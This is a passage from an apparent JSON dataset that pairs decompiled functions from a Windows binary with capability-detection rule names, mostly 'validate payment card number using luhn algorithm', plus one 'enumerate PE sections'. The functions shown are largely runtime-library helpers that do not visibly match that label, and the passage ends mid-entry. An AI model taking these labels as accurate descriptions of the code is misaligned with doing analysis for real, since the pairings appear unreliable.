        "decompiled_code": "\nvoid __cdecl fcn.00405790(uint arg_8h, code *arg_ch)\n\n{\n    code *arg_8h_00;\n    code **in_ECX;\n    \n    *in_ECX = vtable.pcharNode.0;\n    arg_8h_00 = fcn.0040528b(arg_ch);\n    in_ECX[1] = arg_8h_00;\n    in_ECX[2] = arg_ch;\n    if (arg_8h_00 == NULL) {\n        in_ECX[2] = NULL;\n    }\n    else {\n        fcn.00493859(arg_8h_00, arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00405808": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405808(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401474(arg_8h);\n    uVar1 = fcn.00405182(uVar1);\n    fcn.00403058(arg_8h, uVar1);\n    return;\n}\n",
        "token_count": 89
    },
    "0040586c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040586c(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00402a72(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "00405871": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405871(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    fcn.004013cf(arg_8h, &var_10h, 0, &var_8h, 1);\n    return arg_8h;\n}\n",
        "token_count": 116
    },
    "004058e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004058e4(uint param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = param_1;\n    fcn.004038f0(param_1, &var_8h);\n    return;\n}\n",
        "token_count": 73
    },
    "0040591b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.0040591b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56fb08, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406505(0xb);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.004e0ac9(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004e09da();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 291
    },
    "00405943": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00405943(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    int32_t arg_18h;\n    int32_t arg_14h;\n    uint var_4h;\n    \n    arg_8h = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    if (arg_8h != 0) {\n        iVar1 = fcn.004c8e67(arg_8h);\n        arg_14h = iVar1 - arg_8h >> 1;\n        iVar1 = fcn.0040664f(0, 0, arg_8h, arg_14h, 0, 0, 0, 0);\n        if (iVar1 != 0) {\n            arg_18h = fcn.0040409d(iVar1);\n            if (arg_18h == 0) {\ncode_r0x004c8f1d:\n                iVar1 = 0;\n            }\n            else {\n                iVar1 = fcn.0040664f(0, 0, arg_8h, arg_14h, arg_18h, iVar1, 0, 0);\n                if (iVar1 == 0) goto code_r0x004c8f1d;\n                iVar1 = arg_18h;\n                arg_18h = 0;\n            }\n            fcn.0040640b(arg_18h);\n            goto code_r0x004c8f2a;\n        }\n    }\n    iVar1 = 0;\ncode_r0x004c8f2a:\n    if (arg_8h != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 390
    },
    "0040594d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040594d(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint64_t uVar1;\n    double dVar2;\n    double dVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint16_t uVar6;\n    ushort uVar7;\n    uint in_stack_00000010;\n    \n    iVar4 = fcn.00401604(&arg_8h);\n    dVar3 = _arg_8h;\n    if (iVar4 != 2) {\n        iVar5 = fcn.004034fe(&arg_10h);\n        dVar2 = _arg_8h;\n        dVar3 = CONCAT44(in_stack_00000010, arg_10h);\n        if ((iVar5 != 2) && (_arg_8h != dVar3)) {\n            uVar7 = 1;\n            if (iVar4 == 1) {\n                _arg_8h = 1.39067116124321e-309;\n                uVar6 = arg_ch._2_2_ & 0xffef | 0x7fef;\n                uVar7 = 0xffff;\n            }\n            else {\n                if (iVar4 != 0) {\n                    if (((_arg_8h < dVar3) && (0.0 < _arg_8h)) || ((dVar3 < _arg_8h && (_arg_8h < 0.0)))) {\n                        uVar1 = _arg_8h & 0xffffffffffff0000;\n                        _arg_8h = uVar1 | arg_8h + 1U;\n                        dVar3 = _arg_8h;\n                        if (arg_8h + 1U == 0) {\n                            arg_8h._2_2_ = uVar1 >> 0x10;\n                            uVar1 = arg_8h._2_2_ + 1U << 0x10;\n                            _arg_8h = dVar2 & 0xffffffff00000000 | uVar1;\n                            dVar3 = _arg_8h;\n                            if (arg_8h._2_2_ + 1U == 0) {\n                                arg_ch._0_2_ = (dVar2 & 0xffffffff00000000) >> 0x20;\n                                arg_8h = uVar1;\n                                _arg_8h = CONCAT24(arg_ch + 1, arg_8h);\n                                _arg_8h = dVar2 & 0xffff000000000000 | _arg_8h;\n                                dVar3 = _arg_8h;\n                                if (arg_ch + 1 == 0) {\n                                    arg_ch._2_2_ = (dVar2 & 0xffff000000000000) >> 0x30;\n                                    _arg_8h = CONCAT26(arg_ch._2_2_ + 1, _arg_8h);\n                                    dVar3 = _arg_8h;\n                                    if ((arg_ch._2_2_ + 1 & 0x7fff) == 0x7ff0) {\n                                        fcn.00403742(8);\n                                        dVar3 = _arg_8h;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        uVar1 = _arg_8h & 0xffffffffffff0000;\n                        _arg_8h = uVar1 | arg_8h - 1U;\n                        dVar3 = _arg_8h;\n                        if (arg_8h - 1U == 0xffff) {\n                            arg_8h._2_2_ = uVar1 >> 0x10;\n                            arg_8h = CONCAT22(arg_8h._2_2_ + -1, 0xffff);\n                            _arg_8h = dVar2 & 0xffffffff00000000 | arg_8h;\n                            dVar3 = _arg_8h;\n                            if (arg_8h._2_2_ + -1 == -1) {\n                                arg_ch._0_2_ = (dVar2 & 0xffffffff00000000) >> 0x20;\n                                _arg_8h = CONCAT24(arg_ch + -1, arg_8h);\n                                _arg_8h = dVar2 & 0xffff000000000000 | _arg_8h;\n                                dVar3 = _arg_8h;\n                                if (arg_ch + -1 == -1) {\n                                    arg_ch._2_2_ = (dVar2 & 0xffff000000000000) >> 0x30;\n                                    _arg_8h = CONCAT26(arg_ch._2_2_ + -1, _arg_8h);\n                                    dVar3 = _arg_8h;\n                                }\n                            }\n                        }\n                    }\n                    goto code_r0x004e1d80;\n                }\n                if (dVar3 <= _arg_8h) {\n                    uVar6 = 0x8000;\n                }\n                else {\n                    uVar6 = 0;\n                }\n            }\n            _arg_8h = CONCAT62(_arg_8h >> 0x10 & 0xffffffff | (uVar6 << 0x30) >> 0x10, uVar7);\n            dVar3 = _arg_8h;\n        }\n    }\ncode_r0x004e1d80:\n    _arg_8h = dVar3;\n    if ((_arg_8h & 0x7ff0000000000000) == 0) {\n        fcn.00403742(0x10);\n    }\n    return _arg_8h;\n}\n",
        "token_count": 1241
    },
    "0040595c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040595c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 56
    },
    "0040596b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040596b(int32_t *param_1)\n\n{\n    char cVar1;\n    uint var_4h;\n    \n    cVar1 = (**(*param_1 + 0x10))();\n    return cVar1;\n}\n",
        "token_count": 60
    },
    "0040597f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040597f(uint *param_1)\n\n{\n    uint var_4h;\n    \n    return *param_1;\n}\n",
        "token_count": 34
    },
    "00405a0b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a0b(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    uint *in_ECX;\n    uint var_4h;\n    \n    uVar1 = in_ECX[4];\n    if (arg_8h <= uVar1) {\n        if (in_ECX[5] - uVar1 < arg_ch) {\n            fcn.004024aa(arg_ch, in_ECX, arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            in_ECX[4] = uVar1 + arg_ch;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            arg_8h_00 = in_ECX + arg_8h * 2;\n            fcn.004059ac(arg_8h_00 + arg_ch * 2, arg_8h_00, (uVar1 - arg_8h) * 2 + 2);\n            fcn.00404ce1(arg_8h_00, arg_10h, arg_ch);\n        }\n        return;\n    }\n    fcn.00402612();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 309
    },
    "00405a6f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405a6f(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004ca267(0x1f, \"AppPolicyGetWindowingModel\", 0x559964, \"AppPolicyGetWindowingModel\");\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x578000)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 134
    },
    "00405add": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405add(uint arg_8h)\n\n{\n    fcn.00403cd3(0, arg_8h, 0, 10, 1);\n    return;\n}\n",
        "token_count": 46
    },
    "00405b69": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nushort __cdecl fcn.00405b69(uint arg_8h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    iVar2 = fcn.00403d7d(&var_4h, &arg_8h, 1, &var_ch, in_ECX + 0x18);\n    uVar1 = 0xffff;\n    if (-1 < iVar2) {\n        uVar1 = var_4h;\n    }\n    return uVar1;\n}\n",
        "token_count": 162
    },
    "00405b78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405b78(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    if (0 < arg_14h) {\n        arg_14h = fcn.00403eb8(arg_10h, arg_14h);\n    }\n    if (0 < arg_1ch) {\n        arg_1ch = fcn.00403eb8(arg_18h, arg_1ch);\n    }\n    if ((arg_14h == 0) || (arg_1ch == 0)) {\n        if (arg_14h - arg_1ch == 0) {\n            iVar1 = 2;\n        }\n        else {\n            iVar1 = (arg_14h - arg_1ch >> 0x1f & 0xfffffffeU) + 3;\n        }\n    }\n    else {\n        iVar1 = fcn.0040473c(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, 0, 0, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 277
    },
    "00405bbe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405bbe(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.00406203(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        fcn.00403e04(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x18);\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 273
    },
    "00405c31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c31(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uchar var_5h;\n    uint var_4h;\n    \n    fcn.0040595c(arg_8h, arg_ch, arg_10h);\n    fcn.0040595c(arg_8h + arg_10h, arg_14h, arg_18h);\n    var_5h = 0;\n    fcn.00405e0c(arg_8h + arg_10h + arg_18h, &var_5h);\n    return;\n}\n",
        "token_count": 153
    },
    "00405d12": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d12(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_8h) {\n        fcn.004054bb(arg_8h, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_8h;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.00404ce1(in_ECX + iVar1 * 2, arg_ch, arg_8h);\n        *(in_ECX + (iVar1 + arg_8h) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00405d35": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405d35(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.00402a59(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 191
    },
    "00405d49": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d49(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    \n    iVar2 = fcn.00405b64(*in_ECX, in_ECX[1], arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        *(in_ECX + 3) = 1;\n        return;\n    }\n    fcn.0040366b(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 145
    },
    "00405d58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00405d58(uint noname_0, uint noname_1, uint *arg_10h)\n\n{\n    uint *puVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    float10 fVar3;\n    ushort uVar4;\n    uint16_t uVar5;\n    uint uVar6;\n    double dVar7;\n    uint uVar8;\n    uint uVar9;\n    \n    if (arg_10h == NULL) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    arg_8h = fcn.0040524f(0x133f, 0xffff);\n    uVar5 = noname_1 >> 0x10;\n    uVar4 = noname_1;\n    dVar7 = CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n    uVar6 = dVar7 >> 0x20;\n    if ((uVar5 & 0x7ff0) == 0x7ff0) {\n        *arg_10h = 0xffffffff;\n        iVar2 = fcn.00405268(noname_0, uVar6);\n        if (((iVar2 == 1) || (iVar2 == 2)) || (iVar2 == 3)) {\n            fcn.0040524f(arg_8h, 0xffff);\n            return CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n        }\n        dVar7 = CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n        uVar8 = SUB84(*0x555f70 + dVar7, 0);\n        uVar9 = *0x555f70 + dVar7 >> 0x20;\n        uVar6 = 8;\ncode_r0x004946ed:\n        fVar3 = fcn.0040569b(uVar6, 0x17, dVar7, uVar8, uVar9, arg_8h);\n    }\n    else {\n        if (dVar7 == 0.0) {\n            iVar2 = fcn.00404ee4(noname_0, uVar6);\n            if (iVar2 != 0) {\n                *arg_10h = 0;\n                uVar8 = *0x555f80;\n                uVar9 = *0x555f80 >> 0x20;\n                dVar7 = CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n                uVar6 = 0;\n                goto code_r0x004946ed;\n            }\n            dVar7 = CONCAT26(uVar5, CONCAT24(uVar4, noname_0));\n        }\n        fVar3 = fcn.00403a8f(SUB84(dVar7, 0), dVar7 >> 0x20, arg_10h);\n        fcn.0040524f(arg_8h, 0xffff);\n        fVar3 = fVar3;\n    }\n    return fVar3;\n}\n",
        "token_count": 693
    },
    "00405d76": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d76(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.00401e29(arg_8h, arg_ch, 0x7ffffffe);\n        iVar3 = fcn.004037e2(iVar2 + 1);\n        in_ECX[5] = iVar2;\n        in_ECX[4] = arg_8h;\n        fcn.00405830(iVar3, arg_10h, arg_8h * 2);\n        *(arg_8h * 2 + iVar3) = 0;\n        if (7 < arg_ch) {\n            fcn.00401654(*in_ECX, arg_ch * 2 + 2);\n        }\n        *in_ECX = iVar3;\n        return;\n    }\n    fcn.0040393b();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 293
    },
    "00405e34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.00405e34(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *var_4h;\n    \n    if (*arg_8h < *arg_ch) {\n        var_4h = arg_ch;\n    }\n    else {\n        var_4h = arg_8h;\n    }\n    return var_4h;\n}\n",
        "token_count": 90
    },
    "00405e52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405e52(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "00405ede": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ede(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    iVar3 = 0;\n    if (0 < arg_10h) {\n        puVar4 = &arg_10h;\n        do {\n            puVar4 = puVar4 + 1;\n            iVar2 = fcn.00402bf8(arg_8h, arg_ch, *puVar4);\n            if (iVar2 != 0) {\n                fcn.0040366b(0, 0, 0, 0, 0);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00405f1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405f1a(int32_t param_1)\n\n{\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0x10));\n    fcn.00404179(*(param_1 + 0x14));\n    fcn.00404179(*(param_1 + 0x18));\n    return;\n}\n",
        "token_count": 90
    },
    "00405f8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_310h\n\nvoid __cdecl fcn.00405f8d(int32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint *puVar1;\n    uint arg_8h_00;\n    uint var_310h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = arg_14h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((arg_14h == 0) || (arg_8h == 0)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        arg_8h_00 = fcn.00402522(arg_8h, &arg_ch, &var_310h);\n        fcn.00405b5f(arg_8h_00, &var_310h, arg_10h_00);\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    fcn.004030bc(var_310h);\n    return;\n}\n",
        "token_count": 290
    },
    "00405fa6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405fa6(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_8h < 0x3fffffff) && (arg_ch < 0xffffffff / arg_10h)) {\n        if (arg_ch * arg_10h < ~(arg_8h * 4)) {\n            uVar1 = fcn.00405088(arg_8h * 4 + arg_ch * arg_10h, 1);\n            fcn.0040640b(0);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 148
    },
    "00406014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406014(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00493c3a(0, \"FlsAlloc\", 0x555ed4, 0x555edc);\n    if (pcVar1 != NULL) {\n        (**0x578000)(arg_8h);\n        (*pcVar1)();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00493db3. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    return;\n}\n",
        "token_count": 144
    },
    "00406028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00406028(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.00403b02();\n    return *0x4ec354;\n}\n",
        "token_count": 45
    },
    "00406078": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406078(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint *arg_8h_00;\n    uint var_4h;\n    \n    if (arg_8h < in_ECX[5] || arg_8h == in_ECX[5]) {\n        arg_8h_00 = in_ECX;\n        if (7 < in_ECX[5]) {\n            arg_8h_00 = *in_ECX;\n        }\n        in_ECX[4] = arg_8h;\n        fcn.00404ce1(arg_8h_00, arg_ch, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n    }\n    else {\n        fcn.00401ed3(arg_8h, in_ECX, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "004060a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.004060a0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00405a65(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "004060aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004060aa(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.00406203(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        cVar2 = fcn.00405dfd(unaff_EBX & 0xffffff00 | uVar1);\n        if (cVar2 == '\\0') {\n            *(param_1 + 0x18) = 0xffffffff;\n        }\n        else {\n            *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n        }\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 327
    },
    "004060dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060dc(uint arg_8h)\n\n{\n    fcn.004aa9f4(arg_8h, 2, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "004060eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nfloat10 __cdecl fcn.004060eb(uint arg_8h)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(&stack0x00000024, &stack0x00000054);\n    fcn.00403b02();\n    fcn.00403b02();\n    return *0x546ca4;\n}\n",
        "token_count": 120
    },
    "00406104": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406104(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.00402f4f(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 229
    },
    "00406136": {
        "rules": [
